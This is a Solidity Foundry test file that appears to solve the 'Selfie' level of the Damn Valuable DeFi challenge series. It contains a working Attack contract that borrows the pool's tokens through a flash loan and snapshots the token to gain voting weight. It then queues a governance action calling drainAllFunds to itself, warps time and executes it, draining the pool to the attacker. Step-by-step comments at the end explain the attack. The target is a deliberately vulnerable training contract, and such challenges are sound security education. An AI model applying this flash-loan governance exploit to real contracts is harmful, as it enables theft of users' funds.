// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";

contract Attack {
    SimpleGovernance public simplegovernance;
    SelfiePool public selfiepool;
    DamnValuableTokenSnapshot public dvtsnapshot;
    uint256 actionId = 0;

    constructor(address sp, address sg, address dvtsnap) {
        selfiepool = SelfiePool(sp);
        simplegovernance = SimpleGovernance(sg);
        dvtsnapshot = DamnValuableTokenSnapshot(dvtsnap);
    }

    function attack() public {
        selfiepool.flashLoan(dvtsnapshot.balanceOf(address(selfiepool)));
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) public {
        dvtsnapshot.snapshot();
        actionId = simplegovernance.queueAction(
            address(selfiepool), abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0
        );
        dvtsnapshot.transfer(address(selfiepool), borrowAmount);
    }

    function execute() public {
        simplegovernance.executeAction(actionId);
        dvtsnapshot.transfer(address(msg.sender), dvtsnapshot.balanceOf(address(this)));
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Attack attack = new Attack(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
        attack.attack();
        vm.warp(3 days);
        attack.execute();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

// Attack Steps:
// 1. Get the flash loan as an attacker  from pool which will execute the functionCall and execute the recevieToken function in attack contract
// 2. Using the flashloan to execute the Queueaction function in governance contract.
// 3. We have to queue the drainAllFunds function in pool to be executed later because it only accepts transsaction calls from governance contract
// 4. Transfer back the flash loan to pool.
// 5. Execute the executeAction function to drain all the funds from the pool
// 6. Finally transfer the tokens to attacker from Attack contract.
